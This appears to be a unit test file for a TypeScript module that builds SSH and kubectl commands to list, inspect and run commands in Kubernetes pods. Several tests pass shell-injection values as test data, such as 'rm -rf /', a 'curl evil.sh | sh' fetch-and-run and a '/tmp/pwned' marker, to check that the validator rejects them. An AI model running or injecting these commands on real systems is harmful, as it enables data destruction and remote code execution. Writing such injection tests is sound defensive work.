/* eslint-disable @typescript-eslint/no-explicit-any */
import {expect} from 'chai'
import {type SinonStub, stub} from 'sinon'

import type {ServerConnection} from '../../src/k8s/config-loader.js'

import {
  buildDiscoverLabelsArgs,
  buildListPodsArgs,
  buildPodExecArgs,
  buildTinkerCommand,
  parsePodLabels,
  parsePodNames,
  PodRunner,
  type SshRunner,
} from '../../src/k8s/pod-runner.js'

const conn: ServerConnection = {
  allowedExecCommands: [],
  artisanPrefix: 'php artisan',
  bastionHost: 'bastion.example.com',
  blacklistedArtisanCommands: [],
  component: 'api',
  container: 'app',
  namespace: 'sa-prod',
  profileName: 'prod',
  role: 'app',
  sshHost: 'k8s.example.com',
  sshUser: 'allen',
}

/** A profile without a bastion: the runner SSHes straight to the k8s host. */
const directConn: ServerConnection = {
  ...conn,
  bastionHost: undefined,
}

function makeRunner(stdout: string): SshRunner {
  return stub().resolves({exitCode: 0, stderr: '', stdout}) as unknown as SshRunner
}

describe('k8s/pod-runner', () => {
  describe('buildListPodsArgs', () => {
    it('builds the SSH bastion → kubectl host → kubectl get pod chain', () => {
      const args = buildListPodsArgs(conn)
      expect(args[0]).to.equal('allen@bastion.example.com')
      expect(args).to.include('ssh')
      expect(args).to.include('k8s.example.com')
      const remote = args.at(-1)!
      expect(remote).to.include('sudo kubectl -n sa-prod get pod')
      // Must be ONE combined selector: kubectl's -l is a plain string flag,
      // so a second -l would silently replace the first.
      expect(remote).to.include('-l component=api,role=app')
      expect(remote.match(/ -l /g)).to.have.lengthOf(1)
      expect(remote).to.include('--field-selector=status.phase=Running')
      expect(remote).to.include('-o=name')
    })

    it('SSHes directly to the kubectl host when no bastion is set', () => {
      const args = buildListPodsArgs(directConn)
      // First hop is the k8s host itself; no nested `ssh` jump.
      expect(args[0]).to.equal('allen@k8s.example.com')
      expect(args).to.not.include('bastion.example.com')
      // Only a single `--` separates the host from the remote command.
      expect(args.filter((a) => a === 'ssh')).to.have.lengthOf(0)
      const remote = args.at(-1)!
      expect(remote).to.include('sudo kubectl -n sa-prod get pod')
      // No literal quotes on a direct hop: the target shell parses the string
      // first, so quotes would collapse the whole command into one word.
      expect(remote.startsWith("'")).to.be.false
      expect(remote.endsWith("'")).to.be.false
    })

    it('rejects a namespace/component/role containing shell metacharacters', () => {
      expect(() => buildListPodsArgs({...conn, namespace: 'sa-test; rm -rf /'})).to.throw(/Invalid namespace/)
      expect(() => buildListPodsArgs({...conn, component: 'api`whoami`'})).to.throw(/Invalid component/)
      expect(() => buildListPodsArgs({...conn, role: 'app && curl evil.sh | sh'})).to.throw(/Invalid role/)
    })
  })

  describe('buildDiscoverLabelsArgs', () => {
    it('lists every running pod in the namespace — no label selector', () => {
      const args = buildDiscoverLabelsArgs(conn)
      expect(args[0]).to.equal('allen@bastion.example.com')
      const remote = args.at(-1)!
      expect(remote).to.include('sudo kubectl -n sa-prod get pod')
      expect(remote).to.not.include(' -l ')
      expect(remote).to.include(
        'custom-columns=NAME:.metadata.name,COMPONENT:.metadata.labels.component,ROLE:.metadata.labels.role',
      )
      expect(remote).to.include('--no-headers')
      expect(remote).to.include('--field-selector=status.phase=Running')
      // Quoted on the bastion hop, same as the other builders.
      expect(remote.startsWith("'")).to.be.true
      expect(remote.endsWith("'")).to.be.true
    })

    it('drops the literal quotes on a direct connection', () => {
      const args = buildDiscoverLabelsArgs(directConn)
      expect(args[0]).to.equal('allen@k8s.example.com')
      const remote = args.at(-1)!
      expect(remote.startsWith("'")).to.be.false
      expect(remote.endsWith("'")).to.be.false
    })

    it('rejects a namespace containing shell metacharacters (e.g. an unvalidated --namespace override)', () => {
      expect(() => buildDiscoverLabelsArgs({...conn, namespace: "sa-test'; touch /tmp/pwned; echo '"})).to.throw(
        /Invalid namespace/,
      )
    })
  })

  describe('parsePodLabels', () => {
    it('groups pods into distinct component/role combos with counts', () => {
      const stdout = [
        'sa-app-1      api   app',
        'sa-app-2      api   app',
        'sa-worker-1   api   queue-worker',
        'sa-cron-1     cron  scheduler',
        '',
      ].join('\n')
      expect(parsePodLabels(stdout)).to.deep.equal([
        {component: 'api', count: 2, role: 'app'},
        {component: 'api', count: 1, role: 'queue-worker'},
        {component: 'cron', count: 1, role: 'scheduler'},
      ])
    })

    it("keeps kubectl's <none> for pods missing a label", () => {
      const combos = parsePodLabels('sa-db-1   <none>   <none>\n')
      expect(combos).to.deep.equal([{component: '<none>', count: 1, role: '<none>'}])
    })

    it('returns an empty list for empty output', () => {
      expect(parsePodLabels('\n')).to.deep.equal([])
    })
  })

  describe('buildPodExecArgs', () => {
    it('base64-encodes the command so it survives both SSH hops', () => {
      const args = buildPodExecArgs(conn, 'api-prod-1', "echo 'hi' && pwd")
      const remote = args.at(-1) as string
      // The command is decoded remotely via base64 -d, never inlined raw.
      expect(remote).to.not.include("echo 'hi'")
      expect(remote).to.include('base64 -d')
      expect(remote).to.include('sudo kubectl -n sa-prod exec api-prod-1 -c app')
    })

    it('targets the bastion and ssh host with the profile sshUser', () => {
      const args = buildPodExecArgs(conn, 'api-prod-1', 'pwd')
      expect(args[0]).to.equal('allen@bastion.example.com')
      expect(args).to.include('k8s.example.com')
    })

    it('SSHes directly to the kubectl host when no bastion is set', () => {
      const args = buildPodExecArgs(directConn, 'api-prod-1', 'pwd')
      expect(args[0]).to.equal('allen@k8s.example.com')
      expect(args).to.not.include('bastion.example.com')
      expect(args.filter((a) => a === 'ssh')).to.have.lengthOf(0)
      // The encoded remote command still reaches the pod via kubectl.
      const remote = args.at(-1) as string
      expect(remote).to.include('sudo kubectl -n sa-prod exec api-prod-1 -c app')
      // No literal quotes on a direct hop (see buildListPodsArgs test above).
      expect(remote.startsWith("'")).to.be.false
      expect(remote.endsWith("'")).to.be.false
    })

    it('encodes deterministically (round-trips to the original command)', () => {
      const args = buildPodExecArgs(conn, 'pod-1', 'whoami; echo $HOME')
      const remote = args.at(-1) as string
      // Extract the base64 token between `echo ` and ` | base64`.
      const match = /echo ([A-Za-z0-9+/=]+) \| base64 -d/.exec(remote)
      expect(match, 'expected a base64 token in the remote command').to.not.be.null
      const decoded = Buffer.from(match![1], 'base64').toString('utf8')
      expect(decoded).to.equal('whoami; echo $HOME')
    })

    it('rejects a namespace/container containing shell metacharacters', () => {
      expect(() => buildPodExecArgs({...conn, namespace: 'sa-test$(rm -rf /)'}, 'pod-1', 'pwd')).to.throw(
        /Invalid namespace/,
      )
      expect(() => buildPodExecArgs({...conn, container: 'app; id'}, 'pod-1', 'pwd')).to.throw(/Invalid container/)
    })
  })

  describe('buildTinkerCommand', () => {
    it('single-quotes the PHP so the inner bash never expands $variables', () => {
      // The pod's inner `bash -c "$CMD"` re-parses the command line; inside a
      // double-quoted --execute="..." it would expand `$x` away. Single quotes
      // suppress all expansion — and need no base64 binary in the container.
      const command = buildTinkerCommand('$x = 5; echo $x;')
      expect(command).to.equal("tinker --execute='$x = 5; echo $x;'")
    })

    it('preserves double quotes and backticks verbatim', () => {
      const command = buildTinkerCommand('echo "hi `whoami`"; $u = User::first();')
      expect(command).to.equal(`tinker --execute='echo "hi \`whoami\`"; $u = User::first();'`)
    })

    it("escapes embedded single quotes as '\\''", () => {
      const command = buildTinkerCommand("Cache::forget('some_key')")
      expect(command).to.equal(String.raw`tinker --execute='Cache::forget('\''some_key'\'')'`)
    })
  })

  describe('parsePodNames', () => {
    it('strips the pod/ prefix and trims blank lines', () => {
      const pods = parsePodNames('pod/api-prod-1\npod/api-prod-2\n\n')
      expect(pods).to.deep.equal(['api-prod-1', 'api-prod-2'])
    })

    it('returns an empty array for blank input', () => {
      expect(parsePodNames('')).to.deep.equal([])
      expect(parsePodNames('\n\n')).to.deep.equal([])
    })
  })

  describe('PodRunner (with injected fake ssh runner)', () => {
    let sshRunner: SinonStub

    it('listPods parses and returns bare pod names', async () => {
      sshRunner = makeRunner('pod/api-1\npod/api-2\n') as any
      const runner = new PodRunner({sshRunner})
      const pods = await runner.listPods(conn)
      expect(pods).to.deep.equal(['api-1', 'api-2'])
    })

    it('listPods throws when no pods are returned', async () => {
      sshRunner = makeRunner('') as any
      const runner = new PodRunner({sshRunner})
      try {
        await runner.listPods(conn)
        expect.fail('should have thrown')
      } catch (error: any) {
        expect(error.message).to.match(/No running pods/)
      }
    })

    it('exec targets the first pod and returns its stdout', async () => {
      // First call: list pods. Second call: exec.
      sshRunner = stub()
      sshRunner.onCall(0).resolves({exitCode: 0, stderr: '', stdout: 'pod/api-1\npod/api-2\n'})
      sshRunner.onCall(1).resolves({exitCode: 0, stderr: '', stdout: '/var/www\n'})
      const runner = new PodRunner({sshRunner: sshRunner as any})

      const result = await runner.exec(conn, 'pwd')
      expect(result.success).to.be.true
      expect(result.data?.result).to.equal('/var/www\n')
      expect(result.data?.results?.[0].pod).to.equal('api-1')
    })

    it('execAll runs every pod and labels each block', async () => {
      sshRunner = stub()
      sshRunner.onCall(0).resolves({exitCode: 0, stderr: '', stdout: 'pod/api-1\npod/api-2\n'})
      sshRunner.onCall(1).resolves({exitCode: 0, stderr: '', stdout: 'out-1'})
      sshRunner.onCall(2).resolves({exitCode: 0, stderr: '', stdout: 'out-2'})
      const runner = new PodRunner({sshRunner: sshRunner as any})

      const result = await runner.execAll(conn, 'hostname')
      expect(result.success).to.be.true
      const text = result.data?.result as string
      expect(text).to.include('===== api-1 =====')
      expect(text).to.include('===== api-2 =====')
      expect(text).to.include('out-1')
      expect(text).to.include('out-2')
      expect(result.data?.results).to.have.lengthOf(2)
    })

    it('exec keeps stdout and reports the exit code when the remote command exits non-zero', async () => {
      // `grep -c` exits 1 on zero matches while printing a valid `0` —
      // that stdout must not be swallowed.
      sshRunner = stub()
      sshRunner.onCall(0).resolves({exitCode: 0, stderr: '', stdout: 'pod/api-1\n'})
      sshRunner.onCall(1).resolves({exitCode: 1, stderr: 'command terminated with exit code 1', stdout: '0\n'})
      const runner = new PodRunner({sshRunner: sshRunner as any})

      const result = await runner.exec(conn, 'grep -c ERROR storage/logs/laravel.log')
      expect(result.success).to.be.true
      expect(result.data?.result).to.include('0')
      expect(result.data?.result).to.include('[remote command exited with code 1]')
      expect(result.data?.results?.[0].exitCode).to.equal(1)
      expect(result.data?.results?.[0].stdout).to.equal('0\n')
    })

    it('execAll labels a block with the exit code when non-zero', async () => {
      sshRunner = stub()
      sshRunner.onCall(0).resolves({exitCode: 0, stderr: '', stdout: 'pod/api-1\npod/api-2\n'})
      sshRunner.onCall(1).resolves({exitCode: 0, stderr: '', stdout: '3\n'})
      sshRunner.onCall(2).resolves({exitCode: 1, stderr: '', stdout: '0\n'})
      const runner = new PodRunner({sshRunner: sshRunner as any})

      const result = await runner.execAll(conn, 'grep -c ERROR storage/logs/laravel.log')
      expect(result.success).to.be.true
      const text = result.data?.result as string
      expect(text).to.include('===== api-1 =====')
      expect(text).to.include('===== api-2 (exit code 1) =====')
    })

    it('listPods surfaces kubectl/ssh failures instead of reporting "no pods"', async () => {
      sshRunner = stub().resolves({exitCode: 255, stderr: 'Permission denied (publickey).', stdout: ''}) as any
      const runner = new PodRunner({sshRunner})

      const result = await runner.exec(conn, 'pwd')
      expect(result.success).to.be.false
      expect(String(result.error)).to.include('exit code 255')
      expect(String(result.error)).to.include('Permission denied')
      expect(String(result.error)).to.not.include('No running pods')
    })

    it('returns a failure result when the SSH call rejects', async () => {
      sshRunner = stub().rejects(new Error('connection refused')) as any
      const runner = new PodRunner({sshRunner})

      const result = await runner.exec(conn, 'pwd')
      expect(result.success).to.be.false
      expect(String(result.error)).to.match(/connection refused/)
    })

    it('testConnection reports the discovered pods on success', async () => {
      sshRunner = makeRunner('pod/api-1\npod/api-2\n') as any
      const runner = new PodRunner({sshRunner})

      const result = await runner.testConnection(conn)
      expect(result.success).to.be.true
      expect(result.data?.pods).to.deep.equal(['api-1', 'api-2'])
      expect(result.data?.result).to.contain('prod')
      expect(result.data?.result).to.contain('bastion.example.com')
    })

    it('discoverLabels reports distinct combos, components, and roles', async () => {
      sshRunner = makeRunner('sa-app-1   api   app\nsa-app-2   api   app\nsa-worker-1   api   queue-worker\n') as any
      const runner = new PodRunner({sshRunner})

      const result = await runner.discoverLabels(conn)
      expect(result.success).to.be.true
      expect(result.data?.combos).to.deep.equal([
        {component: 'api', count: 2, role: 'app'},
        {component: 'api', count: 1, role: 'queue-worker'},
      ])
      expect(result.data?.components).to.deep.equal(['api'])
      expect(result.data?.roles).to.deep.equal(['app', 'queue-worker'])
      expect(result.data?.namespace).to.equal('sa-prod')
      // The formatted result names the profile's own selector for reference.
      expect(result.data?.result).to.contain('component=api role=app')
    })

    it('discoverLabels fails when the namespace has no running pods', async () => {
      sshRunner = makeRunner('') as any
      const runner = new PodRunner({sshRunner})

      const result = await runner.discoverLabels(conn)
      expect(result.success).to.be.false
      expect(result.error).to.contain('No running pods found in namespace=sa-prod')
    })

    it('testConnection notes the direct connection when no bastion is set', async () => {
      sshRunner = makeRunner('pod/api-1\n') as any
      const runner = new PodRunner({sshRunner})

      const result = await runner.testConnection(directConn)
      expect(result.success).to.be.true
      expect(result.data?.result).to.contain('(none — direct connection)')
      expect(result.data?.result).to.contain('k8s.example.com')
    })

    it('closeAll is a no-op (resolves without error)', async () => {
      const runner = new PodRunner({sshRunner: makeRunner('')})
      // Resolves with undefined; just assert it doesn't throw.
      const out = await runner.closeAll()
      expect(out).to.be.undefined
    })
  })
})
